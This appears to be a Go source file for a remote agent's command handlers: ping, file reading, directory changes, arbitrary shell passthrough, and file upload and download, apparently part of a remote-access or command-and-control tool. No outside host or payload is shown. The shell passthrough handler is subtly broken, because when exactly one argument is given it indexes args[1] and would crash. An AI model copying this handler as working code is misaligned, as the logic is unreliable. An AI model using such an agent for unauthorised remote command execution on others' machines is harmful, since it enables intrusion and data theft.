package agent

import (
	"fmt"
)

func handlePing(args ...string) (string, error) {
	return "pong", nil
}

func handleNOP(args ...string) (string, error) {
	return "NOP", nil
}

func handleCat(args ...string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("no file specified")
	}
	return ReadFile(args[1])
}

func handleChangeDir(args ...string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("no directory specified")
	}
	return ChangeDir(args[1])
}

func handleShellPassThrough(args ...string) (string, error) {
	fmt.Println("Handling shell exec with args:", args)

	if len(args) == 1 {
		return RunShellCommand(args[1])
	}

	return RunShellCommand(args[1], args[2:]...)
}

func handleKill(args ...string) (string, error) {
	return "not implemented", nil
}

func handleDownloadFile(args ...string) (string, error) {
	fmt.Println("Handling download")

	if len(args) < 3 {
		// TODO: hacky error handling
		return "usage: download <remote_file_name> <local_file_path>", nil
		// return "", fmt.Errorf("usage: download <remote_file_name> <local_file_path>")
	}

	return DownloadFile(args[1], args[2])
}

func handleUploadFile(args ...string) (string, error) {
	if len(args) < 3 {
		// TODO: hacky error handling
		// return "", fmt.Errorf("usage: upload <local_file_path> <remote_file_name>")
		return "usage: upload <local_file_path> <remote_file_name>", nil
	}
	return UploadFile(args[1], args[2])
}
